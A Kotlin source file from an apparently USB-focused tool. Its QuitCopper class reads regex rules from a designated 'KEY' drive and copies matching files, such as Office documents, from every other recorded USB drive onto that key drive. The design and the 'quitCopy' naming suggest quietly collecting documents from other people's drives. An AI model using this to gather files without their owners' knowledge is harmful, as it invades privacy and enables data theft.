package io.github.octest.udtultra.logic

import io.github.octest.udtultra.repository.FileTreeManager
import io.github.octest.udtultra.repository.UDTDatabase
import io.github.octest.udtultra.repository.database.FileRecord
import io.github.octest.udtultra.repository.database.UDiskEntry
import io.github.octestx.basic.multiplatform.common.utils.storage
import kotlinx.io.IOException
import java.io.File
import java.io.FileOutputStream

class QuitCopper(private val keyEntry: UDiskEntry) {
    suspend fun start() {
        //                          \.(pptx?|docx?|xlsx?|ppt|doc|xls)$                                      能够匹配ppt等文件
        // 1. 读取规则文件
        val rulesFile = File(keyEntry.target, "KEY_UDT/quitCopy/rules.txt")
        val rules = if (rulesFile.exists()) {
            rulesFile.readLines().map { Regex(it) }
        } else {
            // 没有规则，无需执行
            return
        }

        // 2. 创建目标基础目录
        val baseTargetDir = File(keyEntry.target, "KEY_UDT/quitCopy/Files")
        baseTargetDir.mkdirs()

        // 3. 遍历所有非KEY U盘
        val sourceEntries = UDTDatabase.getEntrys().filter { it.type != UDiskEntry.Companion.Type.KEY.value }

        for (sourceEntry in sourceEntries) {
            // 4. 深度遍历源U盘中的文件
            UDTDatabase.deepSeek(
                entry = sourceEntry,
                path = "",
                seekFile = { fileRecord ->
                    // 只处理已复制完成的文件
                    if (fileRecord.status == 2) {
                        // 检查文件路径是否匹配任何规则
                        if (rules.any { it.matches(fileRecord.relationFilePath) }) {
                            // 6. 复制文件到KEY U盘
                            copyFileToKeyDisk(keyEntry, sourceEntry, fileRecord)
                        }
                    }
                },
                seekDir = { /* 忽略目录 */ }
            )
        }
    }

    private suspend fun copyFileToKeyDisk(
        keyEntry: UDiskEntry,
        sourceEntry: UDiskEntry,
        fileRecord: FileRecord
    ) {
        // 1. 获取源文件
        val sourceFile = FileTreeManager.getExitsFile(sourceEntry, fileRecord.relationFilePath).getOrThrow()

        // 2. 创建目标目录
        val targetDir = File(
            keyEntry.target,
            "KEY_UDT/quitCopy/Files/${sourceEntry.id}${fileRecord.parentDir?.let { "/$it" } ?: ""}"
        )
        targetDir.mkdirs()

        // 3. 复制文件（使用临时文件名）
        val targetFile = File(targetDir, "tmpCP_${fileRecord.fileName}")
        val finalTargetFile = File(targetDir, fileRecord.fileName)

        // 新增：检查目标文件是否已经完整复制
        if (finalTargetFile.exists() && finalTargetFile.length() == sourceFile.length()) {
            return // 文件已经完整复制，跳过
        }

        // 使用WorkStacker进行复制
        WorkStacker.putWork(
            WorkStacker.WorkInfo(
                title = "正在复制文件到KEY U盘: ${fileRecord.relationFilePath}",
                type = WorkStacker.WorkType.CopyToMasterUDisk,
                progressType = WorkStacker.ProgressType.HasProgress
            )
        ) {
            try {
                val totalSize = sourceFile.length()
                var bytesTransferred = targetFile.length() // 初始已传输字节数（断点续传）

                sourceFile.inputStream().use { inputStream ->
                    // 新增：跳过已存在的字节（断点续传）
                    var skipped = 0L
                    while (skipped < bytesTransferred) {
                        val skippedNow = inputStream.skip(bytesTransferred - skipped)
                        if (skippedNow <= 0) {
                            break
                        }
                        skipped += skippedNow
                    }

                    FileOutputStream(targetFile, true).use { outputStream ->
                        val buffer = ByteArray(8192)
                        var bytesRead: Int

                        while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                            outputStream.write(buffer, 0, bytesRead)
                            bytesTransferred += bytesRead

                            val progress = bytesTransferred.toFloat() / totalSize
                            setProgress(progress)
                            setMessage("${storage(bytesTransferred)}/${storage(totalSize)}")
                        }
                    }
                }

                // 复制完成，重命名文件
                targetFile.renameTo(finalTargetFile)
            } catch (e: Throwable) {
                // 修改：仅在非IO异常时删除临时文件（保留断点数据）
                if (e !is IOException) {
                    targetFile.delete()
                }
                throw e
            }
        }
    }
}